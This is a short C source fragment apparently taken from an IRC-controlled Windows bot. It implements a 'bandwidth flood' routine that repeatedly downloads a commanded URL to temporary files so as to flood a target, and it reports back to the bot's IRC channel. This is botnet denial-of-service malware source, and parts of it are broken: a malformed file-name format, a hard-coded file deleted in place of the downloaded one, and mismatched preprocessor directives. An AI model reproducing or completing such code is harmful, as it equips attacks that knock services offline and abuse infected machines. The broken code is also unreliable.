

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_DOWNLOAD
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_BANDWITH
#include "..\Bot\bt1.h"

//Download File
DWORD WINAPI bandwithflood(LPVOID param)
{
	bandwith dbn = *((bandwith *)param);
	char szFile[MAX_PATH], szTempDir[MAX_PATH];
	int i;

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_DEBUG
		printf("[DEBUG] Starting bandwith flood, bandwithflood()\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

			GetTempPath(sizeof(szTempDir), szTempDir);
	for (i = 1; i < dbn.iDelay; i++)
	{
			srand(GetTickCount());
			sprintf(szFile, "%s\\i%.tmp", szTempDir, rand()%9999);
		if (xURLDownloadToFile(dbn.szUrl, szFile) != S_OK)
		{
				irc_msg(dbn.bsock, dbn.szAction, dbn.szChannel, "[BANDWITHFLOOD] bad address or dns.");
				return 0;
		}
		else DeleteFile("C:\\temp.tmp");
	}
		return 0;
}
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if